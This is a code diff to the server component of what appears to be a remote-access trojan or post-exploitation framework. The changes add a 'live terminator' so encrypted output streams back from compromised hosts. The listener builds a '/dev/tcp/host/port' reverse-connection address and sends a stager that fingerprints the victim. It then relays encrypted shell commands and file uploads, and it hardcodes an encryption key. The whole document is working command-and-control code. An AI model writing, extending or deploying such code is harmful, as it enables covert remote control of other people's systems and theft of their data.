@@ -23,10 +23,11 @@ class ESSession:
         self.CDA = CDA
 
 class ESServer:
-    def __init__(self,escryptor,terminator,helper):
+    def __init__(self,escryptor,terminator,liveterminator,helper):
         self.sessions = {}
         self.escryptor = escryptor
         self.terminator = terminator
+        self.liveterminator = liveterminator
         self.shell = ESShell()
         self.binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
         self.h = helper
@@ -36,7 +37,7 @@ class ESServer:
     def listen(self,host,port,verbose):
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
         INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
-            str(host)+" "+str(port)+" "+self.escryptor.key+" "+self.terminator
+            str(host)+" "+str(port)+" "+self.escryptor.key+" "+self.terminator+" "+self.liveterminator
         )
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
@@ -125,10 +126,13 @@ class ESServer:
         except KeyboardInterrupt:
             return
         
-        if session.conn and self.shell.interact(session,self) == -1:
+        if session and self.shell.interact(session,self) == -1:
             self.h.strinfo("closing connection")
             session.conn.close
             time.sleep(0.5)
+        else:
+            self.h.strinfo("closing connection")
+            time.sleep(1)
     
     #MARK: Multiserver
     def multiServerListen(self,host,port):
@@ -252,7 +256,7 @@ class ESServer:
         conn.send(self.escryptor.encryptString(str))
         try:
             data = self.receiveString(conn)
-            if data: print data
+            if data != "": print data
         except:
             print "connection was reset"
             conn.close()
@@ -260,20 +264,35 @@ class ESServer:
 
     def receiveString(self,conn):
         data = ""
+        waslive = 0;
         while 1:
             data += conn.recv(1024)
             if not data:
                 return "something went wrong"
             #terminator when we are done receiving data
             if self.terminator in data:
+                if waslive:
+                    return ""
                 data = data.split(self.terminator)[0]
                 try:
                     result = self.escryptor.decrypt(data)
                     if result == "-1":
                         result = "invalid command"
-                    return result.rstrip()
+                    return result
                 except Exception as e:
                     return str(e)
+            elif self.liveterminator in data:
+                waslive = 1
+                #split from live terminator
+                splitdata = data.split(self.liveterminator)
+                #decrypt data before last self.liveterminator
+                try:
+                    tmpdata = self.escryptor.decrypt(splitdata[len(splitdata) - 2])
+                    if tmpdata:
+                        print tmpdata.rstrip("\n")
+                except Exception as e:
+                    print splitdata+" "+str(e)
+
 
     def uploadFile(self,fileName,location,conn):
         f = open(fileName,"rb")
